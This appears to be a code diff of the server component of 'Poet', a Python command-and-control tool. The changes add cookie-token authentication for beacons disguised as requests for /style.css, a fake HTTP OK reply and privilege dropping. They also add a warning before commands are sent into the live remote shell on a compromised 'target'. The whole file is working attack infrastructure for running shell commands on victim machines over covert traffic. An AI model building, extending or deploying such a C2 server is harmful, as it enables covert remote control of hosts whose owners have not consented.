@@ -1,13 +1,16 @@
 #!/usr/bin/python2.7
 
+import os
 import re
 import sys
 import zlib
+import base64
 import socket
 import os.path
 import argparse
 from datetime import datetime
 
+import config as CFG
 from poetsocket import *
 
 __version__ = '0.4.1'
@@ -290,23 +293,28 @@ class PoetServer(object):
                 continue
             elif inp == 'exit':
                 break
-            else:
-                self.conn.send('shell {}'.format(inp))
-                try:
-                    while True:
-                        rec = self.conn.recv()
-                        if rec == 'shelldone':
-                            break
-                        else:
-                            print rec,
-                except KeyboardInterrupt:
-                    self.conn.send('shellterm')
-                    # flush lingering socket buffer ('shelldone' and any
-                    # excess data) and sync client/server
-                    while self.conn.recv() != 'shelldone':
-                        pass
-                    print
+            elif inp.split()[0] in self.cmds:
+                print """[!] WARNING: You've entered a psh command into the real remote shell on the
+    target. Continue? (y/n)""",
+                if raw_input().lower()[0] != 'y':
                     continue
+
+            self.conn.send('shell {}'.format(inp))
+            try:
+                while True:
+                    rec = self.conn.recv()
+                    if rec == 'shelldone':
+                        break
+                    else:
+                        print rec,
+            except KeyboardInterrupt:
+                self.conn.send('shellterm')
+                # flush lingering socket buffer ('shelldone' and any
+                # excess data) and sync client/server
+                while self.conn.recv() != 'shelldone':
+                    pass
+                print
+                continue
 
     def chint(self, inp):
         """Chint command handler.
@@ -354,9 +362,51 @@ def print_header():
 """.format(__version__)
 
 
-def die():
+def die(msg=None):
+    if msg:
+        print '[!] ({}) {}'.format(datetime.now(), msg)
     print '[-] ({}) Poet server terminated.'.format(datetime.now())
     sys.exit(0)
+
+
+def authenticate(ping):
+    """Verify that the client is in fact connecting by checking the request
+    path and the auth token contained in the cookie.
+
+    Args:
+        ping: http request sent from client (string)
+
+    Returns:
+        None: client authenticated successfully
+        str: the reason authentication failed
+    """
+
+    if ping.startswith('GET /style.css HTTP/1.1'):
+        if 'Cookie: c={};'.format(base64.b64encode(CFG.AUTH)) in ping:
+            return None
+        else:
+            return 'AUTH TOKEN'
+    else:
+        return 'REQUEST'
+
+
+def drop_privs():
+    new_uid = int(os.getenv('SUDO_UID'))
+    new_gid = int(os.getenv('SUDO_GID'))
+
+    # drop group before user, because otherwise you're not privileged enough
+    # to drop group
+    os.setgroups([])
+    os.setregid(new_gid, new_gid)
+    os.setreuid(new_uid, new_uid)
+
+    # check to make sure we can't re-escalate
+    try:
+        os.seteuid(0)
+    except OSError:
+        return
+
+    die('Failed to drop privileges!')
 
 
 def main():
@@ -366,7 +416,13 @@ def main():
         sys.exit(0)
     print_header()
     PORT = int(args.port) if args.port else 443
-    s = PoetSocketServer(PORT)
+    try:
+        s = PoetSocketServer(PORT)
+    except socket.error as e:
+        if e.errno == 13:
+            die('You need to be root!')
+    if os.geteuid() == 0:
+        drop_privs()
     print '[+] Poet server started on {}.'.format(PORT)
     while True:
         try:
@@ -376,8 +432,12 @@ def main():
         conntime = datetime.now()
         ping = conn.recv(SIZE)
         if not ping:
-            raise socket.error('socket connection broken')
-        if ping.startswith('GET /style.css HTTP/1.1'):
+            die('Socket error: {}'.format(e.message))
+        auth_err = authenticate(ping)
+        if auth_err:
+            print '[!] ({}) Connected By: {} -> INVALID! ({})'.format(conntime, addr, auth_err)
+            conn.close()
+        else:
             print '[+] ({}) Connected By: {} -> VALID'.format(conntime, addr)
             conn.send(FAKEOK)
             conn.close()
@@ -385,11 +445,7 @@ def main():
                 PoetServer(s).psh()
                 break
             except socket.error as e:
-                print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
-                die()
-        else:
-            print '[!] ({}) Connected By: {} -> INVALID!'.format(conntime, addr)
-            conn.close()
+                die('Socket error: {}'.format(e.message))
     die()
 
 if __name__ == '__main__':
